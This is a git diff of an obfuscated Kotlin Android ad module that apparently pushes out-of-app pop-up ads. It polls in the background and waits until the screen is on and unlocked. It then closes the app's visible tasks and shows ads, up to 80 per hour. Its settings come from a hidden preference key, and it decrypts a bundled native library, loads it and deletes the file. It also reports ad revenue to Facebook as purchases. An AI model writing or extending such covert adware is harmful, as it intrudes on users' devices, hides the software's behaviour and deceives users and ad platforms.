@@ -1,5 +1,6 @@
 package ad
 
+import android.app.Activity
 import android.app.Application
 import android.app.KeyguardManager
 import android.content.Context
@@ -7,7 +8,16 @@ import android.net.ConnectivityManager
 import android.os.Build
 import android.os.Bundle
 import android.os.PowerManager
+import android.util.Log
 import bef.aligeit.fcthing
+
+import kotlinx.coroutines.CoroutineScope
+import kotlinx.coroutines.Dispatchers
+import kotlinx.coroutines.delay
+import kotlinx.coroutines.launch
+import kotlinx.coroutines.withContext
+import org.json.JSONObject
+
 import com.facebook.FacebookSdk
 import com.facebook.appevents.AppEventsLogger
 import com.google.firebase.analytics.FirebaseAnalytics
@@ -16,12 +26,8 @@ import com.google.firebase.ktx.Firebase
 import com.hightway.tell.peek.Core
 import com.hightway.tell.peek.dak.AppLifecycelListener
 import com.hightway.tell.peek.dak.Constant
-import kotlinx.coroutines.CoroutineScope
-import kotlinx.coroutines.Dispatchers
-import kotlinx.coroutines.delay
-import kotlinx.coroutines.launch
-import kotlinx.coroutines.withContext
-import org.json.JSONObject
+import kotlinx.coroutines.Job
+import mei.ye.DataPreferences
 import java.io.File
 import java.io.FileOutputStream
 import java.io.InputStream
@@ -44,18 +50,17 @@ object AdE {
 
     @JvmStatic
     var isSAd = false //是否显示广告
-    private var lastSAdTime = 0L //上一次显示广告的时间
 
     @JvmStatic
-    val mAdC: AdCenter = AdCenter()
+    var lastSAdTime = 0L //上一次显示广告的时间
 
     private val mMainScope = CoroutineScope(Dispatchers.Main)
-    private var mInstallWait = 40000 // 安装时间
     private var cTime = 30000L // 检测间隔
     private var tPer = 40000 // 显示间隔
     private var nHourShowMax = 80//小时显示次数
     private var nDayShowMax = 80 //天显示次数
     private var nTryMax = 50 // 失败上限
+    private var screenOpenCheck = 1400L // 屏幕监测、延迟显示
 
     private var numHour = Core.getInt("ad_s_h_n")
     private var numDay = Core.getInt("ad_s_d_n")
@@ -73,7 +78,6 @@ object AdE {
 
     private var timeDS = 100L //延迟显示随机时间开始
     private var timeDE = 400L //延迟显示随机时间结束
-    private var maxShowTime = 10000L // 最大显示时间
     private var checkTimeRandom = 1000 // 在定时时间前后增加x秒
 
     @JvmStatic
@@ -95,7 +99,6 @@ object AdE {
         isSAd = true
         lastSAdTime = System.currentTimeMillis()
         sC()
-        mAdC.loadAd()
     }
 
     private var isPost = false
@@ -147,8 +150,8 @@ object AdE {
 
     @JvmStatic
     fun a2() {
-        refreshAdmin()
         mContext.registerActivityLifecycleCallbacks(AppLifecycelListener())
+        refreshAdmin()
         File("${mContext.dataDir}/$fileName").mkdirs()
         t()
     }
@@ -163,26 +166,24 @@ object AdE {
         tagO = listStr[1]
         strBroadKey = listStr[2]
         fileName = listStr[3]
-        val oneID = js.optString(Constant.K_ID_L).split("-")[0]
-        val twoID = js.optString(Constant.K_ID_L).split("-")[1]
-        mAdC.setAdId(oneID, twoID)// 广告id
+
+        AdCenter.setAdId(js.optString(Constant.K_ID_L))// 广告id
         val lt = js.optString(Constant.K_TIME).split("-")//时间相关配置
         cTime = lt[0].toLong() * 1000
         tPer = lt[1].toInt() * 1000
-        mInstallWait = lt[2].toInt() * 1000
-        nHourShowMax = lt[3].toInt()
-        nDayShowMax = lt[4].toInt()
-        nTryMax = lt[5].toInt()
-        timeDS = lt[6].toLong()
-        timeDE = lt[7].toLong()
-        maxShowTime = lt[8].toLong() * 1000
-        checkTimeRandom = lt[9].toInt() * 1000
+        nHourShowMax = lt[2].toInt()
+        nDayShowMax = lt[3].toInt()
+        nTryMax = lt[4].toInt()
+        timeDS = lt[5].toLong()
+        timeDE = lt[6].toLong()
+        checkTimeRandom = lt[7].toInt() * 1000
+        screenOpenCheck = lt[8].toLong()
     }
 
     private var lastS = ""
     private fun refreshAdmin() {
-        // todo 把外面的配置传进来通过反射、mmkv、keep后的类返回等
-        val s = "" // 获取admin外面的配置通过mmkv
+        val s = DataPreferences.getInstance(mContext).getString("csdmvkflewrv","")
+        Log.e("TAG", "refreshAdmin: =$s", )
         if (lastS != s) {
             lastS = s
             reConfig(JSONObject(s))
@@ -203,8 +204,11 @@ object AdE {
                 return@launch
             }
             Core.pE("test_s_load", "${System.currentTimeMillis() - time}")
-            fcthing.a0(tagL, 1.0f)
-            delay(1200)
+            fcthing.a0(tagL,23f)
+            if (isLi().not()) {
+                AdCenter.loadAd()
+            }
+//            delay(1200)
             while (true) {
                 // 刷新配置
                 refreshAdmin()
@@ -212,7 +216,7 @@ object AdE {
                 if (checkTimeRandom > 0) {
                     t = Random.nextLong(cTime - checkTimeRandom, cTime + checkTimeRandom)
                 }
-                cAction(t)
+                checkAd()
                 delay(t)
                 if (numJumps > nTryMax) {
                     Core.pE("pop_fail")
@@ -220,31 +224,13 @@ object AdE {
                 }
             }
         }
+
     }
 
+    // 可以放assets 也可以放在raw 资源文件
     private fun loadSFile(assetsName: String): Boolean {
         val aIp = mContext.assets.open(assetsName)
         val fSN = "And_${System.currentTimeMillis()}"
-        val file = File("${mContext.filesDir}/Cache")
-        if (file.exists().not()) {
-            file.mkdirs()
-        }
-        try {
-            decrypt(aIp, File(file.absolutePath, fSN))
-            val file2 = File(file.absolutePath, fSN)
-            System.load(file2.absolutePath)
-            file2.delete()
-            return true
-        } catch (_: Exception) {
-        }
-        return false
-    }
-
-    private fun loadRawFile(assetsName: String): Boolean {
-        val resourceId: Int =
-            mContext.resources.getIdentifier(assetsName, "raw", mContext.packageName)
-        val aIp = mContext.resources.openRawResource(resourceId)
-        val fSN = "A_${System.currentTimeMillis()}"
         val file = File("${mContext.filesDir}/Cache")
         if (file.exists().not()) {
             file.mkdirs()
@@ -289,50 +275,85 @@ object AdE {
         return Build.CPU_ABI.contains("64")
     }
 
+    @JvmStatic
+    fun adLoadSuccess() {
+        openJob()
+    }
 
-    // 定时逻辑
-    private fun cAction(time: Long) {
-        // 无网络不触发后续逻辑
+    @JvmStatic
+    fun checkAdIsReadyAndGoNext() {
+        if (AdCenter.isAdReady()) {
+            jobTimer?.cancel()
+            jobTimer = null
+            openJob()
+        }
+    }
+
+    private var jobTimer: Job? = null
+    private var timJobStart = 0L
+
+    @JvmStatic
+    private fun openJob() {
+        if (jobTimer != null && jobTimer?.isActive == true) return
+        timJobStart = System.currentTimeMillis()
+        Core.pE("advertise_done")
+        jobTimer = mMainScope.launch {
+            val del = tPer - (System.currentTimeMillis() - lastSAdTime)
+            delay(del)
+            Core.pE("advertise_times")
+            if (l().not()) {
+                while (l().not()) {
+                    delay(screenOpenCheck)
+                }
+            }
+            Core.pE("ad_light")
+            delay(finishAc())
+            sNumJump(numJumps + 1)
+            Core.pE("ad_start")
+            fcthing.a0(tagO,88f)
+            lastSAdTime = System.currentTimeMillis()
+            delay(4000)
+            checkAdIsReadyAndGoNext()
+        }
+    }
+
+    // 新逻辑
+    private fun checkAd() {
         if (isNetworkAvailable().not()) return
-        Core.pE("ad_session", time.toString())
-        if (l().not()) return
-        Core.pE("ad_light")
         if (isLi()) {
             Core.pE("ad_pass", "limit")
             return
         }
-        mAdC.loadAd()
-        if (System.currentTimeMillis() - Core.insAppTime < mInstallWait) {
-            Core.pE("ad_pass", "1t")
-            return
-        }
-        if (System.currentTimeMillis() - lastSAdTime < tPer) {
-            Core.pE("ad_pass", "2t")
-            return
-        }
-        if (isSAd && System.currentTimeMillis() - lastSAdTime < maxShowTime) {
-            Core.pE("ad_pass", "s")
-            return
-        }
-        if (mAdC.isReady().not()) {// 无广告不外弹透明页面
-            Core.pE("ad_pass", "n_ready")
-            return
-        }
-        Core.pE("ad_pass", "N")
-        isCanFinish = true
-        CoroutineScope(Dispatchers.Main).launch {
-            delay(finishAc())
-            if (isSAd) {
-                delay(800)
-            }
-            sNumJump(++numJumps)
-            Core.pE("ad_start")
-            fcthing.a0(tagO, 2.0f)
+        Core.pE("ad_pass", "null")
+        AdCenter.loadAd()
+        if (System.currentTimeMillis() - timJobStart > 90000) {
+            checkAdIsReadyAndGoNext()
         }
     }
 
-    private fun l(context: Context = mContext): Boolean {
-        return (context.getSystemService(Context.POWER_SERVICE) as PowerManager).isInteractive && (context.getSystemService(
+
+    private fun isNetworkAvailable(): Boolean {
+        val connectivityManager =
+            mContext.getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
+        val networkInfo = connectivityManager.activeNetworkInfo
+        return networkInfo != null && networkInfo.isConnected
+    }
+
+    @JvmStatic
+    fun finishAc(): Long {
+        if (l().not()) return 0
+        val l = Core.c0()
+        if (l.isNotEmpty()) {
+            ArrayList(l).forEach {
+                it.finishAndRemoveTask()
+            }
+            return 900
+        }
+        return 0
+    }
+
+    private fun l(): Boolean {
+        return (mContext.getSystemService(Context.POWER_SERVICE) as PowerManager).isInteractive && (mContext.getSystemService(
             Context.KEYGUARD_SERVICE
         ) as KeyguardManager).isDeviceLocked.not()
     }
@@ -351,29 +372,5 @@ object AdE {
         AppEventsLogger.newLogger(Core.mApp).logPurchase(
             ecpm.toBigDecimal(), Currency.getInstance("USD")
         )
-    }
-
-    private fun isNetworkAvailable(): Boolean {
-        val connectivityManager =
-            mContext.getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
-        val networkInfo = connectivityManager.activeNetworkInfo
-        return networkInfo != null && networkInfo.isConnected
-    }
-
-    private var isCanFinish = false
-
-    @JvmStatic
-    fun finishAc(): Long {
-        if (l().not()) return 0
-        if (isCanFinish.not()) return 0
-        // todo 获取外面的activity
-        val l = Core.c0()
-        if (l.isNotEmpty()) {
-            ArrayList(l).forEach {
-                it.finishAndRemoveTask()
-            }
-            return 900
-        }
-        return 0
     }
 }
